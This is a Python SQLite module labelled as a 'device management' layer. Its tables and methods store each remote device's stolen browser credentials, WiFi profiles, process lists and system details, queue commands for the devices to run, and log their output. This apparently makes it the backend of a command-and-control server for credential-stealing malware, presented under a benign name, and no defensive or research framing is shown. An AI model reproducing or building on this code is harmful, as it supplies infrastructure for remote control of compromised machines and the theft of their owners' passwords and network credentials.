"""
SQLite database layer for device management.
"""

import sqlite3
import json
from datetime import datetime


class Database:
    def __init__(self, db_path="devices.db"):
        self.db_path = db_path
        self._init_db()

    def _get_conn(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    def _init_db(self):
        conn = self._get_conn()
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS devices (
                device_id TEXT PRIMARY KEY,
                hostname TEXT,
                status TEXT DEFAULT 'offline',
                last_seen TEXT,
                system_info TEXT,
                processes TEXT,
                wifi_profiles TEXT,
                browser_creds TEXT,
                registered_at TEXT,
                updated_at TEXT
            );

            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                command TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT,
                executed_at TEXT,
                output TEXT,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            );

            CREATE TABLE IF NOT EXISTS command_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                output TEXT,
                timestamp TEXT,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            );
        """)
        conn.commit()
        conn.close()

    def update_device(self, device_id, data):
        conn = self._get_conn()
        now = datetime.utcnow().isoformat()
        conn.execute(
            """
            INSERT OR REPLACE INTO devices
            (device_id, hostname, status, last_seen, system_info,
             processes, wifi_profiles, browser_creds, registered_at, updated_at)
            VALUES (?, ?, 'online', ?, ?, ?, ?, ?,
                    COALESCE((SELECT registered_at FROM devices WHERE device_id=?), ?), ?)
        """,
            (
                device_id,
                data.get("hostname", "unknown"),
                now,
                json.dumps(data.get("system_info", {})),
                json.dumps(data.get("processes", [])),
                json.dumps(data.get("wifi_profiles", [])),
                json.dumps(data.get("browser_creds", {})),
                device_id,
                now,
                now,
            ),
        )
        conn.commit()
        conn.close()

    def get_all_devices(self):
        conn = self._get_conn()
        rows = conn.execute("SELECT * FROM devices ORDER BY updated_at DESC").fetchall()
        conn.close()
        return [dict(r) for r in rows]

    def get_device(self, device_id):
        conn = self._get_conn()
        row = conn.execute(
            "SELECT * FROM devices WHERE device_id=?", (device_id,)
        ).fetchone()
        conn.close()
        if not row:
            return None
        d = dict(row)
        for field in ("system_info", "processes", "wifi_profiles", "browser_creds"):
            try:
                d[field] = json.loads(d[field]) if d[field] else {}
            except Exception:
                d[field] = {}
        return d

    def mark_offline(self, cutoff):
        conn = self._get_conn()
        conn.execute(
            "UPDATE devices SET status='offline' WHERE last_seen < ?",
            (cutoff.isoformat(),),
        )
        conn.commit()
        conn.close()

    def set_command(self, device_id, command):
        conn = self._get_conn()
        conn.execute(
            "INSERT INTO commands (device_id, command, status, created_at) VALUES (?, ?, 'pending', ?)",
            (device_id, command, datetime.utcnow().isoformat()),
        )
        conn.commit()
        conn.close()

    def get_pending_commands(self, device_id):
        conn = self._get_conn()
        rows = conn.execute(
            "SELECT * FROM commands WHERE device_id=? AND status='pending' ORDER BY created_at",
            (device_id,),
        ).fetchall()
        conn.close()
        return [dict(r) for r in rows]

    def mark_command_executed(self, command_id, output):
        conn = self._get_conn()
        conn.execute(
            "UPDATE commands SET status='executed', executed_at=?, output=? WHERE id=?",
            (datetime.utcnow().isoformat(), output, command_id),
        )
        conn.commit()
        conn.close()

    def add_command_result(self, device_id, output):
        conn = self._get_conn()
        conn.execute(
            "INSERT INTO command_results (device_id, output, timestamp) VALUES (?, ?, ?)",
            (device_id, output, datetime.utcnow().isoformat()),
        )
        conn.commit()
        conn.close()

    def get_command_history(self, device_id):
        conn = self._get_conn()
        rows = conn.execute(
            "SELECT * FROM commands WHERE device_id=? ORDER BY created_at DESC LIMIT 50",
            (device_id,),
        ).fetchall()
        conn.close()
        return [dict(r) for r in rows]

    def get_command_results(self, device_id):
        conn = self._get_conn()
        rows = conn.execute(
            "SELECT * FROM command_results WHERE device_id=? ORDER BY timestamp DESC LIMIT 20",
            (device_id,),
        ).fetchall()
        conn.close()
        return [dict(r) for r in rows]
